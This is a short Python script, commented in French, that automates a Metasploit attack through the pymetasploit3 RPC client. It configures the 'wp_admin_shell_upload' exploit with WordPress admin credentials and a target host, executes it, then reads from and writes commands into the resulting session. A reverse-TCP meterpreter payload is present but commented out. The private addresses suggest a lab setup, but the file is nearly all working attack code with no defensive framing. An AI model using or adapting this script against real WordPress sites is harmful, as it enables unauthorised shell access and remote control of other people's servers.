from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('password', server='172.26.0.6', port=55553)

exploit = client.modules.use('exploit', 'unix/webapp/wp_admin_shell_upload')
#payload = client.modules.use('payload', 'python/meterpreter/reverse_tcp')

### ajouter les options au payload et à l'exploit
exploit['USERNAME'] = 'admin'
exploit['PASSWORD'] = 'password'
exploit['RHOSTS'] = '172.26.0.4'
exploit['TARGETURI'] = '/wp'
#payload['LHOST'] = ''
### ....

result = exploit.execute()
print(result)

session = client.sessions.session(0)

session.read()
session.write("commande dans la session")